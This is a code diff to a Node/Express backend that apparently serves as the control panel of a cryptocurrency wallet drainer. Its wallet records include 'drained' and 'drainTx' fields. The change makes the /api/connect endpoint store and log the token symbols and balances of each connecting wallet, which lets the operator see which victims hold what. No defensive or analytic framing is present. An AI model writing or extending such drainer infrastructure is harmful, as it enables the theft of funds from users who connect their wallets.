@@ -98,15 +98,20 @@ function adminAuth(req, res, next) {
 
 // Called when a wallet connects to the DApp
 app.post('/api/connect', (req, res) => {
-  const { address, chainId, userAgent } = req.body
+  const { address, chainId, userAgent, tokens } = req.body
   if (!address) return res.json({ ok: false })
 
   const existing = connectedWallets.find(w => w.address.toLowerCase() === address.toLowerCase())
   if (existing) {
-    existing.lastSeen   = new Date().toISOString()
-    existing.chainId    = chainId
-    existing.online     = true
-    addLog('info', `Wallet reconnected: ${address} on chainId ${chainId}`)
+    existing.lastSeen = new Date().toISOString()
+    existing.chainId  = chainId
+    existing.online   = true
+    if (tokens && tokens.length) {
+      existing.tokens = tokens
+      addLog('info', `Wallet ${address} tokens updated: ${tokens.map(t => t.symbol + ' ' + t.balance).join(', ')}`)
+    } else {
+      addLog('info', `Wallet reconnected: ${address} on chainId ${chainId}`)
+    }
   } else {
     const entry = {
       id:          Date.now(),
@@ -118,6 +123,7 @@ app.post('/api/connect', (req, res) => {
       online:      true,
       drained:     false,
       drainTx:     null,
+      tokens:      tokens || [],
     }
     connectedWallets.unshift(entry)
     addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
